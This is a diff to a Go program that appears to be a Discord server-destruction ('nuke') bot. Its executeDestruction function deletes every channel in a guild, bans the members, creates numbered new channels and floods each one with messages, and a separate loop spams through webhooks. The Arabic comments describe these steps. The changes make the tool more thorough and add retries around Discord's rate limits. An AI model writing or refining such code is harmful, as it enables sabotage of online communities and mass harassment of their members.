@@ -15,7 +15,7 @@ import (
 )
 
 var httpClient = &http.Client{
-	Timeout: 5 * time.Second,
+	Timeout: 10 * time.Second,
 }
 
 func main() {
@@ -191,6 +191,7 @@ func runWebhookSpamLoop(token, channelID, webhookName, messageContent string, to
 
 		urls := createFiveWebhooks(token, channelID, webhookName)
 		if len(urls) == 0 {
+			time.Sleep(500 * time.Millisecond)
 			continue
 		}
 
@@ -336,41 +337,39 @@ func executeDestruction(s *discordgo.Session, token, guildID, roomName string, r
 		"User-Agent":    "DiscordBot (https://discord.com, v10)",
 	}
 
-	// 1. حذف الرومات الحالية بشكل مضمون
-	go func() {
-		req, _ := http.NewRequest("GET", "https://discord.com/api/v10/guilds/"+guildID+"/channels", nil)
+	// 1. حذف الرومات الحالية بالكامل وبشكل متزامن ومضمون
+	req, err := http.NewRequest("GET", "https://discord.com/api/v10/guilds/"+guildID+"/channels", nil)
+	if err == nil {
 		for k, v := range headers {
 			req.Header.Set(k, v)
 		}
 		resp, err := httpClient.Do(req)
-		if err != nil {
-			return
-		}
-		defer resp.Body.Close()
+		if err == nil {
+			var channels []map[string]interface{}
+			json.NewDecoder(resp.Body).Decode(&channels)
+			resp.Body.Close()
 
-		var channels []map[string]interface{}
-		json.NewDecoder(resp.Body).Decode(&channels)
-
-		var wgDel sync.WaitGroup
-		for _, ch := range channels {
-			if id, ok := ch["id"].(string); ok {
-				wgDel.Add(1)
-				go func(chID string) {
-					defer wgDel.Done()
-					delReq, _ := http.NewRequest("DELETE", "https://discord.com/api/v10/channels/"+chID, nil)
-					for k, v := range headers {
-						delReq.Header.Set(k, v)
-					}
-					if r, e := httpClient.Do(delReq); e == nil {
-						r.Body.Close()
-					}
-				}(id)
+			var wgDel sync.WaitGroup
+			for _, ch := range channels {
+				if id, ok := ch["id"].(string); ok {
+					wgDel.Add(1)
+					go func(chID string) {
+						defer wgDel.Done()
+						delReq, _ := http.NewRequest("DELETE", "https://discord.com/api/v10/channels/"+chID, nil)
+						for k, v := range headers {
+							delReq.Header.Set(k, v)
+						}
+						if r, e := httpClient.Do(delReq); e == nil {
+							r.Body.Close()
+						}
+					}(id)
+				}
 			}
+			wgDel.Wait()
 		}
-		wgDel.Wait()
-	}()
+	}
 
-	// 2. جلب الأعضاء عبر API مباشرة وتبنيدهم بدون أخطاء
+	// 2. جلب الأعضاء وتبنيدهم بشكل منظم وآمن
 	go func() {
 		var userIDs []string
 		after := ""
@@ -399,25 +398,25 @@ func executeDestruction(s *discordgo.Session, token, guildID, roomName string, r
 		wgBan.Wait()
 	}()
 
-	// 3. إنشاء الرومات الجديدة والسبام فيها بالعدد الكامل
+	// 3. إنشاء الرومات الجديدة بالعدد المطلوب حرفياً وحفظ آيديهاتها
 	var channelIDs []string
 	var mu sync.Mutex
 	var wgCreate sync.WaitGroup
 
 	for i := 0; i < roomsCount; i++ {
 		wgCreate.Add(1)
-		go func() {
+		go func(index int) {
 			defer wgCreate.Done()
 			payload, _ := json.Marshal(map[string]interface{}{
-				"name": roomName,
+				"name": fmt.Sprintf("%s-%d", roomName, index),
 				"type": 0,
 			})
-			req, _ := http.NewRequest("POST", "https://discord.com/api/v10/guilds/"+guildID+"/channels", bytes.NewBuffer(payload))
+			reqCreate, _ := http.NewRequest("POST", "https://discord.com/api/v10/guilds/"+guildID+"/channels", bytes.NewBuffer(payload))
 			for k, v := range headers {
-				req.Header.Set(k, v)
+				reqCreate.Header.Set(k, v)
 			}
 
-			resp, err := httpClient.Do(req)
+			resp, err := httpClient.Do(reqCreate)
 			if err != nil {
 				return
 			}
@@ -425,17 +424,19 @@ func executeDestruction(s *discordgo.Session, token, guildID, roomName string, r
 
 			if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusCreated {
 				var chResult map[string]interface{}
-				json.NewDecoder(resp.Body).Decode(&chResult)
-				if chID, ok := chResult["id"].(string); ok {
-					mu.Lock()
-					channelIDs = append(channelIDs, chID)
-					mu.Unlock()
+				if json.NewDecoder(resp.Body).Decode(&chResult) == nil {
+					if chID, ok := chResult["id"].(string); ok {
+						mu.Lock()
+						channelIDs = append(channelIDs, chID)
+						mu.Unlock()
+					}
 				}
 			}
-		}()
+		}(i)
 	}
 	wgCreate.Wait()
 
+	// 4. إرسال الرسائل بالعدد الكامل لكل روم تم إنشاؤه مع معالجة الـ Rate Limit
 	var wgMsg sync.WaitGroup
 	for _, chID := range channelIDs {
 		wgMsg.Add(1)
@@ -449,16 +450,19 @@ func executeDestruction(s *discordgo.Session, token, guildID, roomName string, r
 				}
 
 				msgResp, err := httpClient.Do(msgReq)
-				if err == nil {
-					if msgResp.StatusCode == 429 {
-						msgResp.Body.Close()
-						time.Sleep(100 * time.Millisecond)
-						m--
-						continue
-					}
-					msgResp.Body.Close()
+				if err != nil {
+					time.Sleep(50 * time.Millisecond)
+					continue
 				}
-				time.Sleep(15 * time.Millisecond)
+
+				if msgResp.StatusCode == 429 {
+					msgResp.Body.Close()
+					time.Sleep(200 * time.Millisecond)
+					m-- // إعادة محاولة نفس الرسالة عند الحظر المؤقت
+					continue
+				}
+				msgResp.Body.Close()
+				time.Sleep(15 * time.Millisecond) // تأخير آمن لمنع حظر البوت
 			}
 		}(chID)
 	}
